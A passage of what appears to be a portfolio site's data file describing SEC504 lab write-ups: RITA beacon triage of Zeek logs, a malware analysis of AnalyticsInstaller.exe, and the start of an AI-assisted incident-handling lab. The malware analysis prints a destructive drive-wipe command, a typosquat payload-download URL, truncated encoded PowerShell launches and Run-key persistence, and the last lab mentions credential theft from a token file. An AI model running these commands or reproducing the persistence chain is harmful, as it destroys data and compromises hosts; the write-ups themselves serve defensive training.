      "Imported a falsimentis Zeek dataset into RITA and triaged a HIGH severity 98.60% beacon to 91.189.89.198 (Canonical NTP, false positive). Added 91.189.89.0/24 to the CIDR safelist, wired the malwaresum threat-intel feed into config.hjson, and re-imported. The clean run surfaced three HIGH severity beacons from 172.16.42.2 / 172.16.42.3 / 172.16.42.108 to 167.172.201.123, all with Threat Intel hits. Tracing the proxied traffic in access.log revealed the C2 was disguised as www1-google-analytics.com with ORIGINAL_DST 167.172.201.123, and an awk pivot identified four internal hosts (172.16.42.103/105/107/109) calling the same fake-analytics endpoint.",
    whyThisMatters:
      "Modern adversaries blend C2 into legitimate-looking DNS names and ride low-rate beacons that human eyes miss. RITA's beacon score plus a tuned safelist plus a threat-intel feed is the open-source recipe for finding that traffic in a real Zeek pipeline. The skill is not running the tool, it is recognizing which 'high severity' findings are noise and which are the real thing, and knowing how to tune the pipeline to demote the noise without burying the signal.",
    tldr: [
      "Imported a week of falsimentis Zeek logs into RITA, triaged a 98.60% beacon to a Canonical NTP server as a false positive",
      "Tuned config.hjson with a CIDR safelist and an external threat-intel feed (malwaresum), then re-imported the dataset",
      "Surfaced three HIGH severity C2 beacons to 167.172.201.123 disguised as www1-google-analytics.com, and identified four compromised internal hosts via an awk pivot on access.log",
    ],
    skillsDemonstrated: [
      "Zeek log triage (conn.log, dns.log, http.log, ssl.log)",
      "Beacon detection with RITA",
      "Threat-intel feed integration",
      "False-positive tuning via CIDR safelist",
      "Squid/Zeek access.log pivoting with grep and awk",
    ],
    tools: ["RITA", "Zeek", "ClickHouse", "MalwareSum", "awk", "grep"],
    steps: [
      "Stage the falsimentis Zeek dataset and list the log inventory",
      "Import the logs into RITA: ./rita.sh import -l log/ ~/labs/falsimentis/",
      "Open the RITA UI and triage HIGH severity beacons",
      "Confirm or refute the top beacon with MalwareSum (IP reputation)",
      "Edit config.hjson to add a CIDR safelist entry and an online threat-intel feed",
      "Delete the dataset and re-import so the new config applies",
      "Triage the cleaner result and inspect Threat Intel matches",
      "Pivot to access.log to confirm DNS-spoofed C2 (www1-google-analytics.com → 167.172.201.123)",
      "Enumerate all internal hosts touching the malicious destination with awk on access.log",
    ],
    stepDetails: [
      {
        title: "Stage the falsimentis dataset",
        description:
          "The SEC504 falsimentis dataset is a multi-day capture pre-converted to Zeek logs. Listed the logs directory to confirm the standard Zeek stack is present: conn.log, dns.log, http.log, ssl.log, files.log, x509.log, weird.log. Zeek's tab-separated format is what RITA expects on import.",
        screenshot: "/labs/rita-beacon-114040.png",
      },
      {
        title: "Import Zeek logs into RITA",
        description:
          "Ran ./rita.sh import -l log/ ~/labs/falsimentis/. RITA stood up its three containers (clickhouse, syslog-ng, rita-rita-1), ingested the logs, built the connection summary, ran beacon scoring, then ran HTTP, SSL, and DNS analytics. ClickHouse is the column store under the hood; the import is fast because it is bulk-loading into a columnar engine, not parsing on read.",
        command: "./rita.sh import -l log/ ~/labs/falsimentis/",
        commandBreakdown: "-l: tell RITA the input is Zeek log format\nlog/: subdirectory holding the logs\nfalsimentis: dataset name (becomes the database)",
        screenshot: "/labs/rita-beacon-114253.png",
      },
      {
        title: "Open the RITA UI and read the beacon column",
        description:
          "RITA's TUI ranks connections by severity. One HIGH severity row: 172.16.42.20 → 91.189.89.198 with a 98.60% beacon score, 3-second duration, 0 subdomains, prevalence 1/9 (11%). A high beacon score plus low prevalence is exactly the signature analysts are told to chase, but high score alone is not enough. The next step is to verify the destination.",
        screenshot: "/labs/rita-beacon-114327.png",
      },
      {
        title: "Confirm or refute on MalwareSum",
        description:
          "Looked up 91.189.89.198 on MalwareSum. The reputation report identified the IP as belonging to AS41231 Canonical Group Limited, network 91.189.88.0/21, range 91.189.88.0 to 91.189.95.255. Score 623 upvotes / 1 downvote, with comments confirming it is the Canonical NTP server. A 98.60% beacon to NTP is exactly the behavior NTP is supposed to exhibit, so this is a textbook false positive. The signal is real, but the verdict is benign.",
        screenshot: "/labs/rita-beacon-114553.png",
      },
      {
        title: "Cross-check with dns.log",
        description:
          "While in the logs directory, grepped dns.log for lolcats.org, another low-severity destination that surfaced in the RITA report. The query returned a single A-record lookup from 172.16.42.2 → 138.68.44.115, NOERROR, type A. Notable but not the priority lead, confirms RITA's prevalence column is sensible.",
        command: "cd ~/labs/falsimentis/logs/\ngrep lolcats.org dns.log | head -1",
        screenshot: "/labs/rita-beacon-120314.png",
      },
      {
        title: "Tune config.hjson - safelist Canonical NTP",
        description:
          "Ran ./rita.sh view falsimentis to load the dataset, then opened config.hjson in gedit. The config ships with a CIDR safelist for common false-positive sources (Microsoft, Mozilla, AWS, Verizon CDN, etc.). Added \"91.189.89.198/24\" so future imports do not waste analyst time on the Canonical NTP traffic.",
        command: "./rita.sh view falsimentis\ngedit config.hjson",
        screenshot: "/labs/rita-beacon-120601.png",
      },
      {
        title: "Confirm the safelist entry",
        description:
          "Highlighted the new \"91.189.89.198/24\" entry inside the // array of CIDRs block. CIDR scoping is intentional: covering the /24 prevents tomorrow's NTP traffic from a sibling Canonical IP from producing the same false positive.",
        screenshot: "/labs/rita-beacon-120631.png",
      },
      {
        title: "Wire in a threat-intel feed",
        description:
          "Set threat_intel.online_feeds to [\"http://malwaresum.sunsetisp.com/threatfeed\"]. Threat-intel feeds are how RITA marks a destination as 'known bad' without depending on the analyst's recall. The next import will tag matching destinations with the Threat Intel icon in the UI.",
        screenshot: "/labs/rita-beacon-120817.png",
      },
      {
        title: "Delete and re-import so the new config applies",
        description:
          "Ran ./rita.sh delete -ni falsimentis to drop the dataset, then re-imported with the same import command. Config changes apply at import time, not at view time, so the delete-and-reimport step is mandatory whenever the safelist or threat-intel block changes.",
        command: "./rita.sh delete -ni falsimentis",
        commandBreakdown: "-ni: non-interactive (do not prompt)",
        screenshot: "/labs/rita-beacon-120908.png",
      },
      {
        title: "Re-read the RITA UI after tuning",
        description:
          "The Canonical NTP entry is gone (safelisted). Three new HIGH severity rows appear: 172.16.42.108, 172.16.42.3, and 172.16.42.2 all beaconing to 167.172.201.123 with 0% beacon score (suggesting a long-lived session rather than periodic beacon), durations of 1h04m to 1h49m, prevalence 7/9 (78%), and the red Threat Intel marker matched against the malwaresum feed. 78% of monitored internal IPs talking to the same external destination, with three of them maintaining hour-plus sessions, is operator-level C2 traffic.",
        screenshot: "/labs/rita-beacon-121030.png",
      },
      {
        title: "Pivot to access.log - DNS-spoofed C2",
        description:
          "Greped access.log for www1-google-analytics.com (one of the destinations listed by RITA as Low severity in the same UI). One hit: 172.16.42.107 sent a POST to http://www1-google-analytics.com/collect, but the proxy logged ORIGINAL_DST/167.172.201.123. The hostname is a typosquat of www.google-analytics.com and the real destination is the same C2 server flagged HIGH severity by the threat-intel feed. The attacker proxied C2 through a fake-analytics name to blend in with normal web traffic.",
        command: "grep www1-google-analytics.com access.log | head -1",
        screenshot: "/labs/rita-beacon-121353.png",
      },
      {
        title: "Read the full proxied request",
        description:
          "Expanded the same grep to show full request lines. Multiple POSTs to /collect from internal hosts, all proxied to ORIGINAL_DST 167.172.201.123, all with text/html response bodies. /collect is the legitimate Google Analytics measurement endpoint, which is what makes the cover convincing. The HTML response (instead of the expected gif or 204) is the tell.",
        command: "grep www1-google-analytics.com access.log",
        screenshot: "/labs/rita-beacon-121719.png",
      },
      {
        title: "Enumerate every compromised internal host",
        description:
          "Used awk to pull column 3 (source IP) from every access.log row matching www1-google-analytics.com, then sort -u to dedupe. Four hosts surfaced: 172.16.42.103, 172.16.42.105, 172.16.42.107, 172.16.42.109. Combined with the three hosts already flagged by RITA (172.16.42.2, .3, .108) the scope is at least seven internal endpoints touching the same C2 destination. That is the containment list for the next phase of the response.",
        command: "awk '/www1-google-analytics.com/ {print $3}' access.log | sort -u",
        commandBreakdown: "/regex/: pattern to match against each line\n{print $3}: emit field 3 (source IP in Zeek/Squid access.log)\nsort -u: deduplicate",
        screenshot: "/labs/rita-beacon-121851.png",
      },
    ],
    outcome:
      "Drove the full RITA tuning loop on a real Zeek capture: imported, triaged, refuted a high-score false positive against IP reputation, edited the CIDR safelist and threat-intel block in config.hjson, re-imported, and ended with three RITA-flagged plus four awk-pivoted internal hosts (seven total) confirmed to be communicating with 167.172.201.123, a C2 destination disguised behind a www1-google-analytics.com hostname.",
    nextStepsInProduction:
      "Schedule the RITA import job nightly on rolling Zeek logs and wire the resulting HIGH severity rows into the SIEM as an enrichment source, not a primary alert (RITA shines as a triage layer, not a paging layer). Maintain the CIDR safelist as code in version control so safelist drift is reviewable. Replace the lab's single online_feed with the org's actual threat-intel pipeline (MISP, OTX, commercial). For the immediate finding, isolate 172.16.42.2/3/103/105/107/108/109, pull EDR data on each, and block 167.172.201.123 plus the www1-google-analytics.com hostname at the proxy.",
    securityControlsRelevant: [
      "Zeek as the always-on protocol decoder for east-west and north-south traffic",
      "RITA (or similar beacon-detection layer) as a triage overlay on top of Zeek",
      "Curated CIDR safelist for known-benign high-frequency destinations",
      "Threat-intel feed integration for known-malicious destinations",
      "DNS filtering / proxy logging to catch typosquats like www1-google-analytics.com",
      "Egress segmentation so workstation subnets cannot reach arbitrary external IPs",
    ],
    keyFindings: [
      "RITA initial scan: 98.60% beacon score from 172.16.42.20 → 91.189.89.198 (refuted as Canonical NTP via MalwareSum)",
      "Tuned config: added 91.189.89.198/24 to CIDR safelist; added malwaresum threat-intel feed",
      "RITA post-tune: three HIGH severity beacons to 167.172.201.123 with Threat Intel hit, prevalence 7/9 internal hosts",
      "C2 channel disguised as www1-google-analytics.com (typosquat), proxied to ORIGINAL_DST/167.172.201.123",
      "Total compromised internal hosts identified: 172.16.42.2, .3, .103, .105, .107, .108, .109",
    ],
    takeaway: [
      "Beacon score is a lead, not a verdict. The 98.60% score against the Canonical NTP server was a textbook false positive, and any team that pages on raw beacon score will burn out fast. RITA is at its best when it is part of a workflow that ends in MalwareSum / VirusTotal / your internal allow-list, not when it is the alert source itself.",
      "The www1-google-analytics.com typosquat is the lesson of this lab. Operators have figured out that defenders skim hostnames for plausibility, so they pick names that survive a one-second glance. The defense is mechanical: proxy logs every host, you grep the proxy logs, the typosquat shows up because no legitimate Google Analytics traffic ever resolves through a www1-google-analytics.com endpoint. Detection by mechanical comparison beats detection by human recognition.",
      "Tuning RITA's config.hjson is the most important thirty minutes of the workflow. Out of the box, a busy enterprise dataset produces hundreds of high-score rows that are all NTP, CDN, software-update, or telemetry traffic. The CIDR safelist plus a real threat-intel feed is what compresses that pile into the five rows an analyst actually wants to see. Without the tuning step the tool is unusable; with the tuning step it is one of the highest-signal pieces of open-source defensive tooling available.",
    ],
    screenshots: [
      { src: "/labs/rita-beacon-113450.png", alt: "Zeek log listing", caption: "Initial look at ~/labs/falsimentis/logs/ Zeek output" },
      { src: "/labs/rita-beacon-114040.png", alt: "Falsimentis log inventory", caption: "Standard Zeek stack: conn, dns, http, ssl, files, x509, weird" },
      { src: "/labs/rita-beacon-114253.png", alt: "RITA import", caption: "./rita.sh import -l log/ ~/labs/falsimentis/" },
      { src: "/labs/rita-beacon-114327.png", alt: "RITA UI initial scan", caption: "HIGH severity 172.16.42.20 → 91.189.89.198 (98.60% beacon)" },
      { src: "/labs/rita-beacon-114553.png", alt: "MalwareSum lookup", caption: "91.189.89.198 → Canonical Group Limited NTP (false positive)" },
      { src: "/labs/rita-beacon-120314.png", alt: "grep dns.log", caption: "Cross-check the lolcats.org row in dns.log" },
      { src: "/labs/rita-beacon-120601.png", alt: "Open config.hjson", caption: "./rita.sh view falsimentis then gedit config.hjson" },
      { src: "/labs/rita-beacon-120631.png", alt: "Safelist entry added", caption: "Added 91.189.89.198/24 to CIDR safelist" },
      { src: "/labs/rita-beacon-120817.png", alt: "Threat-intel feed", caption: "threat_intel.online_feeds = [http://malwaresum.sunsetisp.com/threatfeed]" },
      { src: "/labs/rita-beacon-120908.png", alt: "Delete dataset", caption: "./rita.sh delete -ni falsimentis before re-importing with new config" },
      { src: "/labs/rita-beacon-121030.png", alt: "RITA post-tune", caption: "Three HIGH severity beacons to 167.172.201.123 with Threat Intel match" },
      { src: "/labs/rita-beacon-121353.png", alt: "access.log pivot", caption: "POST /collect → ORIGINAL_DST 167.172.201.123 via www1-google-analytics.com" },
      { src: "/labs/rita-beacon-121719.png", alt: "Full proxied requests", caption: "Multiple internal hosts POSTing /collect through the typosquat" },
      { src: "/labs/rita-beacon-121851.png", alt: "awk pivot for compromised hosts", caption: "172.16.42.103/105/107/109 all touching the fake-analytics endpoint" },
    ],
  },
  {
    id: 23,
    courseSlug: "sec504",
    slug: "malware-analysis-analyticsinstaller",
    title: "Malware Analysis: AnalyticsInstaller.exe",
    course: "SEC504 - Hacker Tools, Techniques, and Incident Handling",
    role: "Solo, Lab",
    focus: "Malware Analysis",
    level: "SEC504",
    date: "May 2026",
    artifacts: "Sanitized PowerShell, Sysinternals Strings, Regshot, and Process Monitor screenshots from a SEC504 Windows analysis VM",
    context:
      "This lab walks the SEC504 triage workflow for an unknown Windows binary (AnalyticsInstaller.exe) using a fast static pass followed by a controlled dynamic detonation. Static analysis fingerprints the file with a hash and pulls human-readable strings to surface embedded URLs, persistence paths, and an encoded PowerShell payload. Dynamic analysis uses Regshot to diff the registry before and after execution and Process Monitor to capture the live process tree, confirming that the installer drops a scheduled task and launches an encoded PowerShell child process.",
    summary:
      "Triaged AnalyticsInstaller.exe with a static-then-dynamic workflow: hashed it with Get-FileHash (SHA256 D501EF28...), ran Sysinternals Strings to surface IOCs (www1-google-analytics.com:8088/analytics.exe, an HKCU Run key, a base64 -EncodedCommand PowerShell payload, and a destructive AnalyticsBackup.bat containing 'cmd.exe /c rd c:\\ /s /q'), then detonated it under Regshot and Process Monitor. The Regshot diff caught a new Schedule\\TaskCache\\Tree\\Analytics Backup key, Get-ScheduledTask confirmed the 'Analytics Backup' task, and Procmon's process tree showed the installer spawning cmd.exe → powershell.exe -ExecutionPolicy Bypass -EncodedCommand.",
    whyThisMatters:
      "Most incident responders meet malware as a single unexplained binary on a single endpoint. The skill that matters is extracting maximum intelligence from that one file safely and quickly: a hash for threat-intel pivoting, strings for IOCs you can block today, and a controlled detonation that reveals persistence and child processes you would otherwise miss. This lab is the difference between 'we found a weird .exe' and 'here is its hash, its C2, its persistence mechanism, and the destructive payload it was staged to run.'",
    tldr: [
      "Static pass: Get-FileHash for IOC pivoting, then Sysinternals Strings exposed a C2 URL, an HKCU Run key, an encoded PowerShell payload, and a wiper batch file (rd c:\\ /s /q)",
      "Dynamic pass: Regshot before/after diff surfaced a new 'Analytics Backup' scheduled-task registry key; Get-ScheduledTask confirmed it",
      "Process Monitor process tree confirmed AnalyticsInstaller.exe spawning cmd.exe → powershell.exe -EncodedCommand at runtime",
    ],
    skillsDemonstrated: [
      "Static malware triage (Get-FileHash, Sysinternals Strings)",
      "IOC extraction from embedded strings",
      "Encoded-payload and persistence-path recognition",
      "Dynamic analysis with Regshot registry diffing",
      "Process Monitor filtering and process-tree reconstruction",
      "Scheduled-task persistence detection",
    ],
    tools: ["PowerShell", "Get-FileHash", "Sysinternals Strings", "Regshot", "Process Monitor (Procmon)", "Get-ScheduledTask"],
    steps: [
      "Hash the sample with Get-FileHash (MD5 and SHA256) for threat-intel pivoting",
      "Pull readable strings: strings.exe -n 10 .\\AnalyticsInstaller.exe",
      "Read the IOCs out of the strings output (C2 URL, Run key, encoded PowerShell, AnalyticsBackup.bat)",
      "Take a Regshot first shot of the registry baseline",
      "Detonate AnalyticsInstaller.exe in the isolated VM",
      "Confirm the dropped scheduled task with Get-ScheduledTask",
      "Take the Regshot second shot and compare to surface added keys",
      "Read the dropped AnalyticsBackup.bat to confirm the destructive payload",
      "Filter Process Monitor to AnalyticsInstaller.exe and re-detonate",
      "Find the Process Create event and read the encoded PowerShell command line",
      "Reconstruct the process tree to confirm the parent/child chain",
    ],
    stepDetails: [
      {
        title: "Hash the sample",
        description:
          "Started with the cheapest, safest evidence: a file hash. Get-FileHash produced an MD5 (5524BDF546472FD66D3450C39CC4E2E5) and SHA256 (D501EF28D4C3F3C308461E5FB51929E3875395C38E6A885692C8788A3C376E45) of AnalyticsInstaller.exe. A hash is the single most portable IOC, ready to drop into VirusTotal, an EDR block list, or a SIEM watchlist before the binary is ever executed.",
        command: "Get-FileHash -Algorithm MD5 AnalyticsInstaller.exe\nGet-FileHash -Algorithm SHA256 AnalyticsInstaller.exe",
        commandBreakdown: "-Algorithm MD5/SHA256: choose the digest\nDefault output: Algorithm, Hash, Path",
        screenshot: "/labs/malware-analysis-083443.png",
      },
      {
        title: "Pull readable strings",
        description:
          "Ran Sysinternals Strings (strings.exe -n 10) to dump ASCII and Unicode sequences of 10+ characters from the binary. Even without unpacking, the printable strings leaked the malware's intent in plain text: a C2 URL, a persistence path, and a base64 PowerShell blob.",
        command: "C:\\tools\\Sysinternals\\strings.exe -n 10 .\\AnalyticsInstaller.exe",
        commandBreakdown: "-n 10: minimum string length of 10 to cut noise\nStrings dumps both ANSI and Unicode by default",
        screenshot: "/labs/malware-analysis-083731.png",
      },
      {
        title: "Read the IOCs from the strings",
        description:
          "The strings output was a confession. http://www1-google-analytics.com:8088/analytics.exe (a Google Analytics typosquat C2, the same disguise pattern seen in the RITA lab), C:\\Windows\\System32\\analytics.exe (drop path), Software\\Microsoft\\Windows\\CurrentVersion\\Run with an 'Analytics Client' value (Run-key persistence), C:\\Windows\\System32\\AnalyticsBackup.bat, a long powershell.exe -ExecutionPolicy Bypass -EncodedCommand JABt... blob, and cmd.exe /c start /max http://www.midnitemeerkats.com/note. Imported API names (RegOpenKeyExW, RegSetValueExW, RegCloseKey from ADVAPI32) confirmed the binary writes the registry itself.",
        screenshot: "/labs/malware-analysis-083731.png",
      },
      {
        title: "Regshot first shot",
        description:
          "Switched to dynamic analysis. Regshot takes a full snapshot of the registry (and optionally the filesystem) so changes can be diffed after detonation. Configured it to scan C:\\WINDOWS, output to the user profile, then captured the '1st shot' baseline: 395,525 keys and 676,926 values.",
        screenshot: "/labs/malware-analysis-084010.png",
      },
      {
        title: "Detonate and confirm the scheduled task",
        description:
          "Ran AnalyticsInstaller.exe in the isolated VM, then immediately checked for a dropped scheduled task with Get-ScheduledTask. A new task appeared: TaskName 'Analytics Backup', State Ready. Scheduled tasks are a top-tier persistence and execution mechanism precisely because they survive reboots and run on a trigger.",
        command: ".\\AnalyticsInstaller.exe\nGet-ScheduledTask",
        screenshot: "/labs/malware-analysis-084444.png",
      },
      {
        title: "Regshot second shot",
        description:
          "Took the Regshot '2nd shot' after detonation (67,014 keys / 77,922 values in the changed scope) so Regshot could diff the two snapshots. The before/after diff is what turns 'something changed' into a precise list of exactly which keys and values the malware touched.",
        screenshot: "/labs/malware-analysis-084538.png",
      },
      {
        title: "Compare the snapshots",
        description:
          "Ran the Regshot comparison. The engine walked both snapshots and produced a diff report while the green progress bar ran. Comparing 395K-key baselines against the post-detonation state is exactly the kind of mechanical, high-coverage work that a human could never do by eye.",
        screenshot: "/labs/malware-analysis-084637.png",
      },
      {
        title: "Read the Regshot diff report",
        description:
          "Opened the ~res-x64.txt diff. Keys added: 7, including the smoking gun HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\Analytics Backup, alongside the matching Plain and Tasks TaskCache GUID entries. This is the registry footprint of the 'Analytics Backup' scheduled task confirmed independently of Get-ScheduledTask, plus the deleted keys/values from normal Windows churn (WER TermReason entries) that a responder learns to ignore.",
        screenshot: "/labs/malware-analysis-084831.png",
      },
      {
        title: "Read the dropped batch payload",
        description:
          "Used Get-Content to read the dropped C:\\Windows\\SysWOW64\\AnalyticsBackup.bat. Its entire contents: cmd.exe /c rd c:\\ /s /q. That is a destructive wiper: a recursive, quiet, force delete of the C: drive. Naming a drive-wipe 'AnalyticsBackup' and scheduling it as 'Analytics Backup' is deliberate camouflage so a skimming defender reads 'backup' and moves on.",
        command: "Get-Content C:\\Windows\\SysWOW64\\AnalyticsBackup.bat",
        screenshot: "/labs/malware-analysis-085841.png",
      },
      {
        title: "Filter Process Monitor",
        description:
          "Launched Sysinternals Process Monitor and set a filter: Process Name is AnalyticsInstaller.exe → Include, with the usual analysis-tool noise (Procmon, Procexp, Autoruns, System) excluded. Filtering before detonation keeps the capture focused on the malware's own activity instead of the thousands of events Windows generates per second.",
        screenshot: "/labs/malware-analysis-090106.png",
      },
      {
        title: "Re-detonate under Procmon",
        description:
          "Re-ran AnalyticsInstaller.exe with Process Monitor capturing. The filtered event stream records every file, registry, process, and network operation the binary performs, in order, with full detail.",
        command: ".\\AnalyticsInstaller.exe",
        screenshot: "/labs/malware-analysis-090321.png",
      },
      {
        title: "Find the Process Create event",
        description:
          "Used Procmon's Find (Ctrl+F) for 'Process Create' to jump straight to the moment the malware spawned a child process, skipping past the file and registry operations to the execution event that matters most.",
        screenshot: "/labs/malware-analysis-090416.png",
      },
      {
        title: "Read the encoded PowerShell command line",
        description:
          "The Process Create event properties revealed the child: C:\\WINDOWS\\SysWOW64\\cmd.exe launching cmd.exe /c powershell.exe -ExecutionPolicy Bypass -EncodedCommand AEkAZgBHAG8... The -EncodedCommand flag takes base64 so the real script never appears in plaintext on the command line, and -ExecutionPolicy Bypass sidesteps script restrictions. This is the runtime confirmation of the encoded blob seen statically in the strings.",
        screenshot: "/labs/malware-analysis-090518.png",
      },
      {
        title: "Reconstruct the process tree",
        description:
          "Opened Procmon's Process Tree to see the full lineage: AnalyticsInstaller.exe (PID 5804), launched by powershell.exe under Explorer, started and exited within ~21 seconds. The tree ties the binary, its parent shell, and its short-lived execution window together into one picture, which is exactly what an IR timeline needs.",
        screenshot: "/labs/malware-analysis-090553.png",
      },
    ],
    outcome:
      "Took an unknown Windows binary from 'unexplained .exe' to a full IOC and behavior profile in one sitting. Static analysis gave a hash, a typosquat C2 (www1-google-analytics.com:8088), Run-key persistence, and an encoded PowerShell payload. Dynamic analysis with Regshot proved the 'Analytics Backup' scheduled-task persistence at the registry level, Get-ScheduledTask confirmed the task, the dropped AnalyticsBackup.bat turned out to be a C:-drive wiper, and Process Monitor's process tree caught the cmd.exe → powershell.exe -EncodedCommand execution chain.",
    nextStepsInProduction:
      "Push the SHA256 and the network IOCs (www1-google-analytics.com:8088, midnitemeerkats.com) to EDR block lists and the SIEM watchlist immediately. Hunt the fleet for the 'Analytics Backup' scheduled task, the HKCU/HKLM Run 'Analytics Client' value, and any analytics.exe / AnalyticsBackup.bat on disk. Decode the captured base64 -EncodedCommand offline to recover the real PowerShell stage. Given the wiper payload, prioritize containment over observation: isolate any host showing the persistence before the scheduled task fires.",
    securityControlsRelevant: [
      "Application control / WDAC to block unsigned binaries from user-writable paths",
      "PowerShell script-block logging and transcription to capture decoded -EncodedCommand content",
      "Scheduled-task and Run-key baselining with alerting on new entries",
      "EDR detonation/behavioral detection for cmd.exe → powershell.exe -EncodedCommand chains",
      "Egress filtering and DNS monitoring for typosquatted analytics domains",
      "Tamper-resistant, offline backups to survive a destructive 'rd c:\\ /s /q' payload",
    ],
    keyFindings: [
      "SHA256 D501EF28D4C3F3C308461E5FB51929E3875395C38E6A885692C8788A3C376E45 (MD5 5524BDF546472FD66D3450C39CC4E2E5)",
      "C2 / payload URL: http://www1-google-analytics.com:8088/analytics.exe (Google Analytics typosquat)",
      "Persistence: HKCU/HKLM ...\\CurrentVersion\\Run 'Analytics Client' and a 'Analytics Backup' scheduled task",
      "Dropped wiper: AnalyticsBackup.bat containing cmd.exe /c rd c:\\ /s /q",
      "Runtime: AnalyticsInstaller.exe → cmd.exe → powershell.exe -ExecutionPolicy Bypass -EncodedCommand",
    ],
    takeaway: [
      "Strings is the highest return-on-effort tool in malware triage and it is almost free. Before unpacking, before a sandbox, before a debugger, a thirty-second strings run on this sample handed over the C2 URL, the persistence path, the encoded payload, and the name of the wiper batch file. Plenty of commodity malware never bothers to encrypt its strings because authors assume nobody will look. Look first; you will often be done before the sandbox finishes booting.",
      "Regshot is a poor man's EDR for a controlled detonation and it caught the persistence cleanly. Diffing a 395,000-key registry snapshot against the post-execution state is impossible by hand and trivial for the tool, and the 'Analytics Backup' TaskCache key fell straight out of the diff. The discipline that makes this work is taking the baseline before you detonate, every single time, because you only get one clean 'before.'",
      "The naming was the most instructive part of this sample. 'AnalyticsInstaller', 'Analytics Client', 'Analytics Backup', a typosquat of Google Analytics for C2. Every artifact was named to read as benign telemetry, and the destructive wiper was filed under 'Backup', a word defenders associate with safety. Attackers optimize for the half-second a tired analyst spends reading a name. The defense is mechanical verification: read what the file actually does (rd c:\\ /s /q), not what it is called.",
    ],
    screenshots: [
      { src: "/labs/malware-analysis-083443.png", alt: "Get-FileHash MD5 and SHA256", caption: "Get-FileHash AnalyticsInstaller.exe (SHA256 D501EF28...)" },
      { src: "/labs/malware-analysis-083731.png", alt: "Sysinternals Strings output", caption: "strings.exe -n 10 surfaces C2 URL, Run key, encoded PowerShell, and AnalyticsBackup.bat" },
      { src: "/labs/malware-analysis-084010.png", alt: "Regshot first shot", caption: "Regshot 1st shot baseline: 395,525 keys / 676,926 values" },
      { src: "/labs/malware-analysis-084444.png", alt: "Get-ScheduledTask after detonation", caption: "Dropped scheduled task 'Analytics Backup' shows State Ready" },
      { src: "/labs/malware-analysis-084538.png", alt: "Regshot second shot", caption: "Regshot 2nd shot captures the post-detonation state to diff" },
      { src: "/labs/malware-analysis-084637.png", alt: "Regshot comparing", caption: "Regshot diffs the before/after snapshots" },
      { src: "/labs/malware-analysis-084831.png", alt: "Regshot diff report", caption: "~res-x64.txt: added key Schedule\\TaskCache\\Tree\\Analytics Backup" },
      { src: "/labs/malware-analysis-085841.png", alt: "AnalyticsBackup.bat contents", caption: "Get-Content AnalyticsBackup.bat → cmd.exe /c rd c:\\ /s /q (wiper)" },
      { src: "/labs/malware-analysis-090106.png", alt: "Process Monitor filter", caption: "Procmon filter: Process Name is AnalyticsInstaller.exe → Include" },
      { src: "/labs/malware-analysis-090311.png", alt: "Re-detonate under Procmon", caption: ".\\AnalyticsInstaller.exe captured by Process Monitor" },
      { src: "/labs/malware-analysis-090321.png", alt: "Procmon event stream", caption: "Filtered Process Monitor capture of the malware's activity" },
      { src: "/labs/malware-analysis-090416.png", alt: "Procmon Find Process Create", caption: "Find → 'Process Create' to jump to the execution event" },
      { src: "/labs/malware-analysis-090518.png", alt: "Process Create event properties", caption: "cmd.exe /c powershell.exe -ExecutionPolicy Bypass -EncodedCommand" },
      { src: "/labs/malware-analysis-090553.png", alt: "Procmon process tree", caption: "AnalyticsInstaller.exe (PID 5804) in the process tree under powershell.exe" },
    ],
  },
  {
    id: 24,
    courseSlug: "sec504",
    slug: "ai-assisted-incident-handling",
    title: "AI-Assisted Incident Handling",
    course: "SEC504 - Hacker Tools, Techniques, and Incident Handling",
    role: "Solo, Lab",
    focus: "AI for Security Operations",
    level: "SEC504",
    date: "May 2026",
    artifacts: "Sanitized screenshots of a self-hosted gpt-4.1 (OpenWebUI) session across three incident-handling use cases",
    context:
      "This lab uses a locally hosted LLM (gpt-4.1 served through OpenWebUI, started with the SEC504 goaichat helper) as a force-multiplier across three distinct incident-handling tasks: deobfuscating a heavily obfuscated malicious batch script and extracting its IOCs, generating a PowerShell baseline-collection tool for live response, and drafting a structured incident-response playbook from an Event of Interest. The emphasis is on prompt construction and verification, and on doing all of it against a self-hosted model so sensitive malware and IOCs never leave the analyst's environment.",
    summary:
      "Drove a self-hosted gpt-4.1 (OpenWebUI via goaichat at localhost:8080) through three incident-handling jobs. First, uploaded an obfuscated analytics-backup.bat and prompted the model to deobfuscate the variable-fragmented commands step by step, reconstruct the hidden PowerShell, and extract IOCs (genusight.net/collect, genusight.s3.amazonaws.com/XhXrnSbE.exe, %TEMP%\\bitsadmin.exe, a Startup-folder copy, %USERPROFILE%\\.azure\\accessTokens.json credential theft, and an HKCU Run\\BITSAdmin key). Second, had it author BaselineCollector.ps1, a PowerShell 5.1 tool that snapshots services, tasks, users, firewall rules, ports, Run keys, and WMI subscriptions to JSON for Compare-Object diffing, plus usage documentation. Third, seeded it with an expert-IR system prompt and an Event of Interest (a CEO-workstation breach) to generate a MITRE ATT&CK-mapped response playbook.",
    whyThisMatters:
      "LLMs are now part of the incident-handler's toolkit whether teams plan for it or not. Used well, a model collapses an hour of manual batch-script deobfuscation into minutes and drafts tooling and playbooks an analyst can refine. Used carelessly, it leaks the very malware and IOCs an investigation is trying to contain into a third-party service, and it hands over confident-but-wrong answers that go unverified. This lab practices the good version: a self-hosted model, deliberate step-by-step prompting, and treating every output as a lead to verify rather than a verdict.",
    tldr: [
      "Used a self-hosted gpt-4.1 to deobfuscate a variable-fragmented malicious batch script and extract its full IOC set",
      "Had the model generate BaselineCollector.ps1 (PowerShell 5.1, JSON output for Compare-Object) plus usage docs for live-response baselining",
      "Seeded an expert-IR system prompt with an Event of Interest to draft a MITRE ATT&CK-mapped incident-response playbook, all on a local model so malware and IOCs never left the environment",
    ],
    skillsDemonstrated: [
      "AI-assisted malware deobfuscation and IOC extraction",
      "Prompt engineering for security tasks (role priming, step-by-step decomposition)",
      "LLM-generated tooling review (PowerShell baseline collector)",
      "Incident-response playbook development with MITRE ATT&CK mapping",
      "Operational security of self-hosted LLMs for sensitive data",
    ],
    tools: ["gpt-4.1", "OpenWebUI", "goaichat", "Docker", "PowerShell 5.1", "MITRE ATT&CK"],
    steps: [
      "Start the local AI stack: goaichat launches Docker + OpenWebUI (gpt-4.1) at localhost:8080",
      "Review the raw obfuscated sample: cat analytics-backup.bat",
      "Prompt gpt-4.1 as a Windows malware analyst to deobfuscate the uploaded script",
      "Ask it to decode the fragmented variables and print the commands one per line",
      "Ask it to deobfuscate the PowerShell portion step by step (the %QMZA% line)",
      "Extract a structured IOC list from the deobfuscated commands",
      "Pivot to tooling: prompt for a PowerShell baseline-collection script using Compare-Object",
